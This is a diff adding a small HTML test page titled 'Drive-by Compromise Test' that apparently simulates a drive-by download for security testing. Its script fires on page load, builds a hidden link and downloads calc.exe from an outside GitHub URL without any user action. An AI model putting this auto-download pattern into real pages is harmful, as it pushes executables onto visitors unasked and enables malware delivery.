@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Drive-by Compromise Test</title>
+    <script>
+        function downloadExecutable() {
+            // Create a hidden download link
+            var link = document.createElement('a');
+            link.href = "https://github.com/crzyscholar/random/raw/main/calc.exe";
+            link.download = "calc.exe";
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
+
+        window.onload = function() {
+            downloadExecutable();
+        };
+    </script>
+</head>
+<body>
+    <h1>Drive-by Compromise Test Page</h1>
+    <p>This page simulates downloading an executable file.</p>
+</body>
+</html>
